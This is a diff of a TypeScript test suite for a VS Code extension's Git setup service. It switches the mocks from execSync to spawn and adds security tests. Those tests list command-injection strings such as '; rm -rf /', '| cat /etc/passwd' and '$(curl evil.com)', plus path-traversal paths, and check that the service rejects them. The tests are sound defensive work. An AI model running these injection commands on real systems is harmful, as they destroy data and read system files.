@@ -1,6 +1,8 @@
 import * as assert from 'assert';
 import * as vscode from 'vscode';
 import * as sinon from 'sinon';
+import { spawn } from 'child_process';
+import { EventEmitter } from 'events';
 import { GitSetupService } from '../../services/gitSetupService';
 
 suite('GitSetupService Tests', () => {
@@ -47,17 +49,27 @@ suite('GitSetupService Tests', () => {
 
   suite('Git Status Detection', () => {
     test('should detect git installation correctly', async () => {
-      // Mock successful git --version command
-      const execSyncStub = sandbox.stub(require('child_process'), 'execSync');
-      execSyncStub.withArgs('git --version', { stdio: 'ignore' }).returns('git version 2.39.0');
+      // Mock successful spawn for git --version
+      const mockProcess = new EventEmitter() as any;
+      mockProcess.kill = sandbox.stub();
+      const spawnStub = sandbox.stub(require('child_process'), 'spawn');
+      spawnStub.withArgs('git', ['--version']).returns(mockProcess);
 
       // Mock workspace
       sandbox.stub(vscode.workspace, 'workspaceFolders').value([
         { uri: vscode.Uri.file('/test/workspace') }
       ]);
 
-      // Mock git rev-parse command for repository check
-      execSyncStub.withArgs('git rev-parse --git-dir', sinon.match.any).returns('.git');
+      // Mock successful spawn for git rev-parse
+      const mockRepoProcess = new EventEmitter() as any;
+      mockRepoProcess.kill = sandbox.stub();
+      spawnStub.withArgs('git', ['rev-parse', '--git-dir']).returns(mockRepoProcess);
+
+      // Trigger successful responses
+      setTimeout(() => {
+        mockProcess.emit('close', 0);
+        mockRepoProcess.emit('close', 0);
+      }, 10);
 
       const status = await gitSetupService.getGitStatus();
 
@@ -67,9 +79,16 @@ suite('GitSetupService Tests', () => {
     });
 
     test('should handle git not installed', async () => {
-      // Mock failed git --version command
-      const execSyncStub = sandbox.stub(require('child_process'), 'execSync');
-      execSyncStub.withArgs('git --version', { stdio: 'ignore' }).throws(new Error('Command not found'));
+      // Mock failed spawn for git --version
+      const mockProcess = new EventEmitter() as any;
+      mockProcess.kill = sandbox.stub();
+      const spawnStub = sandbox.stub(require('child_process'), 'spawn');
+      spawnStub.withArgs('git', ['--version']).returns(mockProcess);
+
+      // Trigger error response
+      setTimeout(() => {
+        mockProcess.emit('error', new Error('Command not found'));
+      }, 10);
 
       const status = await gitSetupService.getGitStatus();
 
@@ -79,17 +98,27 @@ suite('GitSetupService Tests', () => {
     });
 
     test('should handle git installed but no repository', async () => {
-      // Mock successful git --version command
-      const execSyncStub = sandbox.stub(require('child_process'), 'execSync');
-      execSyncStub.withArgs('git --version', { stdio: 'ignore' }).returns('git version 2.39.0');
+      // Mock successful spawn for git --version
+      const mockProcess = new EventEmitter() as any;
+      mockProcess.kill = sandbox.stub();
+      const spawnStub = sandbox.stub(require('child_process'), 'spawn');
+      spawnStub.withArgs('git', ['--version']).returns(mockProcess);
 
       // Mock workspace
       sandbox.stub(vscode.workspace, 'workspaceFolders').value([
         { uri: vscode.Uri.file('/test/workspace') }
       ]);
 
-      // Mock failed git rev-parse command for repository check
-      execSyncStub.withArgs('git rev-parse --git-dir', sinon.match.any).throws(new Error('Not a git repository'));
+      // Mock failed spawn for git rev-parse
+      const mockRepoProcess = new EventEmitter() as any;
+      mockRepoProcess.kill = sandbox.stub();
+      spawnStub.withArgs('git', ['rev-parse', '--git-dir']).returns(mockRepoProcess);
+
+      // Trigger responses
+      setTimeout(() => {
+        mockProcess.emit('close', 0); // git --version succeeds
+        mockRepoProcess.emit('close', 1); // git rev-parse fails
+      }, 10);
 
       const status = await gitSetupService.getGitStatus();
 
@@ -99,12 +128,19 @@ suite('GitSetupService Tests', () => {
     });
 
     test('should handle no workspace folder', async () => {
-      // Mock successful git --version command
-      const execSyncStub = sandbox.stub(require('child_process'), 'execSync');
-      execSyncStub.withArgs('git --version', { stdio: 'ignore' }).returns('git version 2.39.0');
+      // Mock successful spawn for git --version
+      const mockProcess = new EventEmitter() as any;
+      mockProcess.kill = sandbox.stub();
+      const spawnStub = sandbox.stub(require('child_process'), 'spawn');
+      spawnStub.withArgs('git', ['--version']).returns(mockProcess);
 
       // Mock no workspace
       sandbox.stub(vscode.workspace, 'workspaceFolders').value(undefined);
+
+      // Trigger successful response
+      setTimeout(() => {
+        mockProcess.emit('close', 0);
+      }, 10);
 
       const status = await gitSetupService.getGitStatus();
 
@@ -258,7 +294,12 @@ suite('GitSetupService Tests', () => {
         workspaceFolder: '/test/workspace'
       });
 
-      const execSyncStub = sandbox.stub(require('child_process'), 'execSync').returns('');
+      const mockProcess = new EventEmitter() as any;
+      mockProcess.kill = sandbox.stub();
+      mockProcess.stderr = new EventEmitter();
+      const spawnStub = sandbox.stub(require('child_process'), 'spawn');
+      spawnStub.returns(mockProcess);
+      
       const showMessageStub = sandbox.stub(vscode.window, 'showInformationMessage');
       
       // Mock user selections
@@ -266,10 +307,16 @@ suite('GitSetupService Tests', () => {
       showMessageStub.onCall(1).resolves('Yes'); // Confirm initialization
       showMessageStub.onCall(2).resolves('No'); // Skip initial commit
 
-      await gitSetupService.showGitSetupGuidance();
+      const promise = gitSetupService.showGitSetupGuidance();
+      
+      setTimeout(() => {
+        mockProcess.emit('close', 0); // git init succeeds
+      }, 10);
+      
+      await promise;
 
-      assert.ok(execSyncStub.calledWith('git init', sinon.match({ cwd: '/test/workspace' })), 
-        'Should execute git init command');
+      assert.ok(spawnStub.calledWith('git', ['init']), 
+        'Should execute git init command with spawn');
     });
 
     test('should handle open folder action', async () => {
@@ -309,26 +356,23 @@ suite('GitSetupService Tests', () => {
 
   suite('Repository Initialization', () => {
     test('should initialize repository with initial commit', async () => {
-      // Mock successful git init
-      const execSyncStub = sandbox.stub(require('child_process'), 'execSync').returns('');
+      // Mock successful git commands
+      const mockProcess = new EventEmitter() as any;
+      mockProcess.kill = sandbox.stub();
+      mockProcess.stderr = new EventEmitter();
+      const spawnStub = sandbox.stub(require('child_process'), 'spawn');
+      spawnStub.returns(mockProcess);
       
-      // Mock file system operations
-      const fsStub = {
-        existsSync: sandbox.stub().returns(false),
-        writeFileSync: sandbox.stub()
+      // Mock VS Code workspace fs API
+      const mockFs = {
+        stat: sandbox.stub().rejects(new Error('File not found')), // .gitignore doesn't exist
+        writeFile: sandbox.stub().resolves()
       };
-      sandbox.stub(require('fs'), 'existsSync').callsFake(fsStub.existsSync);
-      sandbox.stub(require('fs'), 'writeFileSync').callsFake(fsStub.writeFileSync);
-
-      // Mock path operations
-      sandbox.stub(require('path'), 'join').returns('/test/workspace/.gitignore');
+      sandbox.stub(vscode.workspace, 'fs').value(mockFs);
 
       const showMessageStub = sandbox.stub(vscode.window, 'showInformationMessage');
-      showMessageStub.onCall(0).resolves('Yes'); // Confirm create initial commit
-      showMessageStub.onCall(1).resolves(); // Success message
 
-      // Test the private method through public interface
-      // We would need to expose this for testing or test through the public interface
+      // Test through public interface
       sandbox.stub(gitSetupService, 'getGitStatus').resolves({
         hasGit: true,
         hasRepository: false,
@@ -339,20 +383,33 @@ suite('GitSetupService Tests', () => {
       showMessageStub.onCall(1).resolves('Yes'); // Confirm initialization
       showMessageStub.onCall(2).resolves('Yes'); // Create initial commit
 
-      await gitSetupService.showGitSetupGuidance();
+      const promise = gitSetupService.showGitSetupGuidance();
+      
+      // Simulate successful git commands
+      setTimeout(() => {
+        mockProcess.emit('close', 0); // git init succeeds
+        setTimeout(() => {
+          mockProcess.emit('close', 0); // git add succeeds  
+          setTimeout(() => {
+            mockProcess.emit('close', 0); // git commit succeeds
+          }, 10);
+        }, 10);
+      }, 10);
+      
+      await promise;
 
-      assert.ok(execSyncStub.calledWith('git init', sinon.match({ cwd: '/test/workspace' })), 
-        'Should execute git init');
-      assert.ok(execSyncStub.calledWith('git add .', sinon.match({ cwd: '/test/workspace' })), 
-        'Should add files to git');
-      assert.ok(execSyncStub.calledWith('git commit -m "Initial commit"', sinon.match({ cwd: '/test/workspace' })), 
-        'Should create initial commit');
+      assert.ok(spawnStub.calledWith('git', ['init']), 'Should execute git init');
+      assert.ok(spawnStub.calledWith('git', ['add', '.']), 'Should add files to git');
+      assert.ok(spawnStub.calledWith('git', ['commit', '-m', 'Initial commit']), 'Should create initial commit');
     });
 
     test('should handle git init errors gracefully', async () => {
       // Mock failed git init
-      const execSyncStub = sandbox.stub(require('child_process'), 'execSync');
-      execSyncStub.throws(new Error('Git init failed'));
+      const mockProcess = new EventEmitter() as any;
+      mockProcess.kill = sandbox.stub();
+      mockProcess.stderr = new EventEmitter();
+      const spawnStub = sandbox.stub(require('child_process'), 'spawn');
+      spawnStub.returns(mockProcess);
 
       const showErrorStub = sandbox.stub(vscode.window, 'showErrorMessage').resolves();
       const showMessageStub = sandbox.stub(vscode.window, 'showInformationMessage');
@@ -366,7 +423,14 @@ suite('GitSetupService Tests', () => {
       showMessageStub.onCall(0).resolves('Initialize Repository');
       showMessageStub.onCall(1).resolves('Yes'); // Confirm initialization
 
-      await gitSetupService.showGitSetupGuidance();
+      const promise = gitSetupService.showGitSetupGuidance();
+      
+      setTimeout(() => {
+        mockProcess.stderr.emit('data', 'Git init failed');
+        mockProcess.emit('close', 1); // git init fails
+      }, 10);
+      
+      await promise;
 
       assert.ok(showErrorStub.calledOnce, 'Should show error message on git init failure');
     });
@@ -454,6 +518,373 @@ suite('GitSetupService Tests', () => {
       assert.ok(showMessageStub.calledTwice, 'Should show status details and handle action');
       const actions = showMessageStub.getCall(0).args[3]; // Fourth argument should be action buttons
       assert.ok(actions.includes('Setup Git Repository'), 'Should offer setup action');
+    });
+  });
+
+  // =====================================================
+  // SECURITY TEST SUITE - Added per code review feedback
+  // =====================================================
+
+  suite('Security Tests - Command Injection Prevention', () => {
+    test('should prevent command injection in git arguments', async () => {
+      // Mock malicious git arguments
+      const maliciousArgs = ['init', '; rm -rf /'];
+      
+      let errorThrown = false;
+      try {
+        // Access the private method for testing (in real implementation, we'd use a test helper)
+        const method = (gitSetupService as any).executeGitCommand;
+        if (method) {
+          await method.call(gitSetupService, maliciousArgs, '/test/workspace');
+        }
+      } catch (error) {
+        errorThrown = true;
+        assert.ok(error instanceof Error);
+        assert.ok(error.message.includes('Invalid characters'), 'Should reject malicious arguments');  
+      }
+      
+      assert.ok(errorThrown, 'Should throw error for malicious arguments');
+    });
+
+    test('should sanitize git command arguments', async () => {
+      // Test various injection attempts
+      const maliciousArguments = [
+        ['init', '&& echo hacked'],
+        ['init', '| cat /etc/passwd'],
+        ['init', '`rm -rf /`'],
+        ['init', '$(curl evil.com)']
+      ];
+
+      for (const args of maliciousArguments) {
+        let errorThrown = false;
+        try {
+          const method = (gitSetupService as any).executeGitCommand;
+          if (method) {
+            await method.call(gitSetupService, args, '/test/workspace');
+          }
+        } catch (error) {
+          errorThrown = true;
+          assert.ok(error instanceof Error);
+          assert.ok(error.message.includes('Invalid characters'), 
+            `Should reject malicious arguments: ${args.join(' ')}`);
+        }
+        
+        assert.ok(errorThrown, `Should reject malicious arguments: ${args.join(' ')}`);
+      }
+    });
+
+    test('should use spawn with argument array instead of shell execution', async () => {
+      // Mock workspace
+      sandbox.stub(vscode.workspace, 'workspaceFolders').value([
+        { uri: vscode.Uri.file('/test/workspace') }
+      ]);
+
+      const mockProcess = new EventEmitter() as any;
+      mockProcess.kill = sandbox.stub();
+      mockProcess.stderr = new EventEmitter();
+      const spawnStub = sandbox.stub(require('child_process'), 'spawn');
+      spawnStub.returns(mockProcess);
+
+      // Test that spawn is called with separate arguments
+      const method = (gitSetupService as any).executeGitCommand;
+      if (method) {
+        const promise = method.call(gitSetupService, ['init'], '/test/workspace');
+        
+        setTimeout(() => {
+          mockProcess.emit('close', 0);
+        }, 10);
+        
+        await promise;
+        
+        assert.ok(spawnStub.calledOnce, 'Should call spawn');
+        const spawnArgs = spawnStub.getCall(0).args;
+        assert.strictEqual(spawnArgs[0], 'git', 'Should call git command');
+        assert.deepStrictEqual(spawnArgs[1], ['init'], 'Should pass arguments as array');
+        assert.ok(spawnArgs[2].cwd, 'Should set working directory');
+      }
+    });
+  });
+
+  suite('Security Tests - Path Traversal Prevention', () => {
+    test('should validate workspace paths', async () => {
+      // Mock workspace
+      sandbox.stub(vscode.workspace, 'workspaceFolders').value([
+        { uri: vscode.Uri.file('/test/workspace') }
+      ]);
+
+      // Test path traversal attempts
+      const maliciousPaths = [
+        '../../../etc/passwd',
+        '/etc/passwd',
+        '../../../../tmp/evil',
+        '/tmp/outside-workspace'
+      ];
+
+      for (const maliciousPath of maliciousPaths) {
+        let errorThrown = false;
+        try {
+          const method = (gitSetupService as any).validateWorkspacePath;
+          if (method) {
+            method.call(gitSetupService, maliciousPath);
+          }
+        } catch (error) {
+          errorThrown = true;
+          assert.ok(error instanceof Error);
+          assert.ok(error.message.includes('outside workspace boundary'), 
+            `Should reject path traversal: ${maliciousPath}`);
+        }
+        
+        assert.ok(errorThrown, `Should reject path traversal: ${maliciousPath}`);
+      }
+    });
+
+    test('should only allow paths within workspace', async () => {
+      // Mock workspace
+      sandbox.stub(vscode.workspace, 'workspaceFolders').value([
+        { uri: vscode.Uri.file('/test/workspace') }
+      ]);
+
+      // Test valid paths within workspace
+      const validPaths = [
+        '/test/workspace',
+        '/test/workspace/subfolder',
+        '/test/workspace/deep/nested/folder'
+      ];
+
+      for (const validPath of validPaths) {
+        const method = (gitSetupService as any).validateWorkspacePath;
+        if (method) {
+          const result = method.call(gitSetupService, validPath);
+          assert.ok(result, `Should accept valid workspace path: ${validPath}`);
+          assert.ok(result.startsWith('/test/workspace'), 'Should resolve to workspace');
+        }
+      }
+    });
+
+    test('should handle empty or null paths', async () => {
+      const method = (gitSetupService as any).validateWorkspacePath;
+      if (method) {
+        // Test empty string
+        let errorThrown = false;
+        try {
+          method.call(gitSetupService, '');
+        } catch (error) {
+          errorThrown = true;
+          assert.ok(error instanceof Error);
+          assert.ok(error.message.includes('cannot be empty'));
+        }
+        assert.ok(errorThrown, 'Should reject empty path');
+
+        // Test null workspace
+        sandbox.stub(vscode.workspace, 'workspaceFolders').value(undefined);
+        errorThrown = false;
+        try {
+          method.call(gitSetupService, '/some/path');
+        } catch (error) {
+          errorThrown = true;
+          assert.ok(error instanceof Error);
+          assert.ok(error.message.includes('No workspace folder'));
+        }
+        assert.ok(errorThrown, 'Should reject when no workspace');
+      }
+    });
+  });
+
+  suite('Security Tests - Timeout and Error Handling', () => {
+    test('should timeout git commands appropriately', async () => {
+      // Mock workspace
+      sandbox.stub(vscode.workspace, 'workspaceFolders').value([
+        { uri: vscode.Uri.file('/test/workspace') }
+      ]);
+
+      const mockProcess = new EventEmitter() as any;
+      mockProcess.kill = sandbox.stub();
+      mockProcess.stderr = new EventEmitter();
+      const spawnStub = sandbox.stub(require('child_process'), 'spawn');
+      spawnStub.returns(mockProcess);
+
+      const method = (gitSetupService as any).executeGitCommand;
+      if (method) {
+        let errorThrown = false;
+        try {
+          const promise = method.call(gitSetupService, ['init'], '/test/workspace');
+          
+          // Don't emit close event to simulate hanging process
+          // The timeout should trigger
+          
+          await promise;
+        } catch (error) {
+          errorThrown = true;
+          assert.ok(error instanceof Error);
+          assert.ok(error.message.includes('timed out'), 'Should timeout hanging process');
+        }
+        
+        assert.ok(errorThrown, 'Should throw timeout error');
+        assert.ok(mockProcess.kill.called, 'Should kill hanging process');
+      }
+    });
+
+    test('should handle git command failures gracefully', async () => {
+      // Mock workspace
+      sandbox.stub(vscode.workspace, 'workspaceFolders').value([
+        { uri: vscode.Uri.file('/test/workspace') }
+      ]);
+
+      const mockProcess = new EventEmitter() as any;
+      mockProcess.kill = sandbox.stub();
+      mockProcess.stderr = new EventEmitter();
+      const spawnStub = sandbox.stub(require('child_process'), 'spawn');
+      spawnStub.returns(mockProcess);
+
+      const method = (gitSetupService as any).executeGitCommand;
+      if (method) {
+        let errorThrown = false;
+        try {
+          const promise = method.call(gitSetupService, ['init'], '/test/workspace');
+          
+          setTimeout(() => {
+            mockProcess.stderr.emit('data', 'Git command failed');
+            mockProcess.emit('close', 1); // Non-zero exit code
+          }, 10);
+          
+          await promise;
+        } catch (error) {
+          errorThrown = true;
+          assert.ok(error instanceof Error);
+          assert.ok(error.message.includes('Git command failed'), 'Should include stderr output');
+        }
+        
+        assert.ok(errorThrown, 'Should throw error for failed git command');
+      }
+    });
+
+    test('should handle process spawn errors', async () => {
+      // Mock workspace
+      sandbox.stub(vscode.workspace, 'workspaceFolders').value([
+        { uri: vscode.Uri.file('/test/workspace') }
+      ]);
+
+      const mockProcess = new EventEmitter() as any;
+      mockProcess.kill = sandbox.stub();
+      const spawnStub = sandbox.stub(require('child_process'), 'spawn');
+      spawnStub.returns(mockProcess);
+
+      const method = (gitSetupService as any).executeGitCommand;
+      if (method) {
+        let errorThrown = false;
+        try {
+          const promise = method.call(gitSetupService, ['init'], '/test/workspace');
+          
+          setTimeout(() => {
+            mockProcess.emit('error', new Error('spawn ENOENT'));
+          }, 10);
+          
+          await promise;
+        } catch (error) {
+          errorThrown = true;
+          assert.ok(error instanceof Error);
+          assert.ok(error.message.includes('Git command error'));
+        }
+        
+        assert.ok(errorThrown, 'Should handle spawn errors');
+      }
+    });
+  });
+
+  suite('Security Tests - Input Validation', () => {
+    test('should validate argument types', async () => {
+      const method = (gitSetupService as any).executeGitCommand;
+      if (method) {
+        // Test non-string arguments
+        const invalidArgs = [
+          [123, 'init'], // number
+          [null, 'init'], // null
+          [undefined, 'init'], // undefined
+          [{ cmd: 'init' }, 'init'] // object
+        ];
+
+        for (const args of invalidArgs) {
+          let errorThrown = false;
+          try {
+            await method.call(gitSetupService, args as any, '/test/workspace');
+          } catch (error) {
+            errorThrown = true;
+            assert.ok(error instanceof Error);
+            assert.ok(error.message.includes('must be strings'), 
+              `Should reject non-string arguments: ${JSON.stringify(args)}`);
+          }
+          
+          assert.ok(errorThrown, `Should reject non-string arguments: ${JSON.stringify(args)}`);
+        }
+      }
+    });
+
+    test('should prevent repository URL injection in clone operations', async () => {
+      // Mock git ready state but no repository
+      sandbox.stub(gitSetupService, 'getGitStatus').resolves({
+        hasGit: true,
+        hasRepository: false,
+        workspaceFolder: '/test/workspace'
+      });
+
+      const executeCommandSpy = sandbox.spy(vscode.commands, 'executeCommand');
+      const showMessageStub = sandbox.stub(vscode.window, 'showInformationMessage')
+        .resolves('Clone Repository');
+
+      await gitSetupService.showGitSetupGuidance();
+
+      // Verify that we delegate to VS Code's built-in git.clone command
+      // rather than handling URLs ourselves (prevents URL injection)
+      assert.ok(executeCommandSpy.calledWith('git.clone'), 
+        'Should delegate to VS Code git.clone to prevent URL injection');
+    });
+  });
+
+  suite('Security Tests - File System Operations', () => {
+    test('should use VS Code workspace API instead of direct fs operations', async () => {
+      // Mock workspace
+      sandbox.stub(vscode.workspace, 'workspaceFolders').value([
+        { uri: vscode.Uri.file('/test/workspace') }
+      ]);
+
+      // Mock VS Code workspace fs API
+      const mockFs = {
+        stat: sandbox.stub().rejects(new Error('File not found')), // .gitignore doesn't exist
+        writeFile: sandbox.stub().resolves()
+      };
+      sandbox.stub(vscode.workspace, 'fs').value(mockFs);
+
+      // Mock git commands
+      const mockProcess = new EventEmitter() as any;
+      mockProcess.kill = sandbox.stub();
+      mockProcess.stderr = new EventEmitter();
+      const spawnStub = sandbox.stub(require('child_process'), 'spawn');
+      spawnStub.returns(mockProcess);
+
+      // Mock confirmation dialogs
+      const showMessageStub = sandbox.stub(vscode.window, 'showInformationMessage');
+      showMessageStub.onCall(0).resolves('Initialize Repository');
+      showMessageStub.onCall(1).resolves('Yes'); // Confirm initialization
+      showMessageStub.onCall(2).resolves('Yes'); // Create initial commit
+
+      // Start the test
+      const promise = gitSetupService.showGitSetupGuidance();
+      
+      setTimeout(() => {
+        mockProcess.emit('close', 0); // git init succeeds
+        setTimeout(() => {
+          mockProcess.emit('close', 0); // git add succeeds
+          setTimeout(() => {
+            mockProcess.emit('close', 0); // git commit succeeds
+          }, 10);
+        }, 10);
+      }, 10);
+
+      await promise;
+
+      // Verify VS Code APIs were used instead of direct file system access
+      assert.ok(mockFs.stat.calledOnce, 'Should check file existence via VS Code API');
+      assert.ok(mockFs.writeFile.calledOnce, 'Should write file via VS Code API');
     });
   });
 });
